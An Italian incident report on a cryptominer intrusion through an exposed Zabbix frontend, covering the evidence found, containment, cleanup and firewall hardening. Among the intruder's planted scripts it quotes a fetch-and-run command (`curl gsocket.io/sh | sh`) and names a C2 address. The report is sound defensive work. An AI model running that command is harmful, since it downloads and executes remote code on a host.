# 19 — Incidente mc2 / stack Zabbix: cryptominer da frontend esposto (2026-10-01)

Stato: CONTENUTO e RIPULITO il 01/10/2026 (~17:30-17:45 CEST). Evidenza: `~/incident_20261001_evidence/`
(+ `.tgz` con sha256) su mc2. Questo doc riassume fatti, azioni, e cosa resta da fare.

## Cosa è stato trovato
- **Due processi miner XMRig** dentro il container `zabbix-server` (mc2), figli diretti di
  `zabbix_server` (spawn via esecuzione script lato server):
  - `369156a` (UPX, exe cancellato, ~2,4 GB RSS, 219% CPU, attivo dalle 04:26 UTC);
  - `syslog-ng-b20e5e6b` (XMRig travestito, ~2,4 GB RSS, 127% CPU, dalle 10:44 UTC).
- **Loader `bws`** (ELF, /tmp del container) con **C2 `92.119.178.59`** (HTTP GET `/?a=&h=&t=&p=`).
- Staging nascosti: `.syslog-187170c4/`, `.X11-unix-socket/` (con `.kworker_sys` e `.self`
  tipo-impianto con componente `lpe_core`), `/dev/shm/duet`, `/var/tmp/.bin`, `.wget-hsts`
  (download da github.com il 01/10 10:44 UTC), history ripulita.
- **Watchdog di ri-deploy**: dopo il primo kill dei miner comparivano
  `/dev/shm/.miner_missing_*`/`.miner_redeploy_*` e un processo `bin syslog-helper`.
- **Accesso admin Zabbix dell'intruso**: token API `zz-backup` (creato 22/09 16:05),
  script `test_exec`, `system_check` (`curl gsocket.io/sh | sh`), `zz_a95152` (recon),
  `sw_272550`, `zshell_zkbf3mpa_srv` (backdoor). Azioni web da IP mascherato (docker-proxy).

## Azioni eseguite (in ordine)
1. Evidenza catturata PRIMA di toccare: binari (`/proc/*/exe`), env/cmdline, `.self`,
   `docker diff` server/web, alberi `/tmp`, `/var/lib/zabbix`, dump tabelle chiave DB.
2. Kill dei miner → rilevato re-deploy automatico → **stop dei container `zabbix-web` e
   `zabbix-server`** (contenimento netto).
3. **Porte chiuse**: compose modificato → `127.0.0.1:1080:8080` e `127.0.0.1:10051:10051`
   (prima 0.0.0.0/:: — esposti). L'accesso legittimo passa dai tunnel autossh mc2→MARCODG1
   (endpoint `127.0.0.1` lato mc2), quindi **nulla si è rotto**.
4. **Container ricreati da immagine** (`zabbix-server`, `zabbix-web`): layer di scrittura
   dell'attaccante eliminato (payload sparito, /dev/shm vuoto, nessun miner).
5. **Pulizia Zabbix**: token `zz-backup` eliminato; 5 script intrusi eliminati (restano i
   nostri + default); **password Admin ruotata e verificata**; **tutte le sessioni azzerate**
   (67.622 → 0). `push_metrics.py` e `/tmp/.zbx_cred` aggiornati automaticamente.
6. **polkitd**: RSS anomalo ~4 GB (leak, binario integro) → restart → 11 MB (+4 GB liberati).
7. Sweep host (mc2/MARCODG1/nuvola): nessun accesso anomalo nei log, cron integri, nessun
   file sospetto residuo, nessuna chiave ssh estranea evidente.
8. **fleet/monitor check**: push_metrics OK (42 valori), fabbrica attiva, canary OK.

## Hardening completato (01/10/2026, sera) — punti 1-2
- **Firewall mc2** (`deploy/hardening/mc2-hardening-ports.sh` + unit `mc2-hardening.service`,
  persistente): catena `MC2HARD` su iptables E ip6tables — DROP dall'esterno su
  {80,443,445,139,9100,5557,5558,5201,50080,1080,10051,8901}; consentiti lo, tailscale0,
  192.168/16. Verificato: Prometheus mc2 `up=1` (via tailscale), push_metrics OK, fabbrica OK.
- **Rotte Cloudflare chiuse**: rimosse `zabbix.grivetto.eu` e `agent-zero.grivetto.eu` dal
  tunnel "home" (mc2; backup `config.yml.bak-20261001`). Entrambe ora → 404 da fuori.
- **nginx MARCODG1**: disabilitati i vhost legacy `zabbix-marcodg1` e `agent-zero-marcodg1`
  (backup `~/backup-hardening-20261001/` + copie `.disabled-20261001` in sites-available):
  `mgrivett.ddns.net` e `:50080` non servono più niente di sensibile (prima: Zabbix alla
  root + aggregatore + A0 senza auth, pubblici). `zab.grivetto.eu` RESTA (unico accesso
  web allo Zabbix): **in attesa di Cloudflare Access — richiede un click del proprietario**
  (Zero Trust → Access → Applications → Add self-hosted → `zab.grivetto.eu` → policy email).
- **Credenziali DB Zabbix ruotate** (utenti `zabbix` e `root` in mariadb; compose
  aggiornato e chmod 600). **Immagini Zabbix 7.0 aggiornate** (digest nuovi) e container
  `zabbix-server`/`zabbix-web` ricreati. Verifiche: login+push OK, web 200, nessun errore
  DB nei log, dati intatti (volume).
- **Da fare ancora (proprietario)**: click Cloudflare Access su `zab.grivetto.eu` (opz. anche
  `grafana.grivetto.eu` e `ssh.grivetto.eu`, stessa logica).
- **Da fare ancora (hermes, prossimi giorni)**: `dashboard.grivetto.eu` = pagina statica mc2
  (innocua, valutare rimozione); sshd mc2 ha ancora password auth attiva (valutare
  `PasswordAuthentication no` dopo verifica client); audit periodico script/token/media
  Zabbix; conservare l'evidenza ~30 giorni, poi decidere se cancellare.

## Lezione incisa
Gli strumenti di monitoraggio SONO superficie d'attacco: un frontend di monitoring esposto
pubblicamente con credenziali deboli vale una shell sull'host che monitora. Mai bind
`0.0.0.0` per console di amministrazione; accesso solo via tunnel/localhost; audit periodico
di utenti/token/script; le credenziali dei tool interni si ruotano come quelle dei bot.
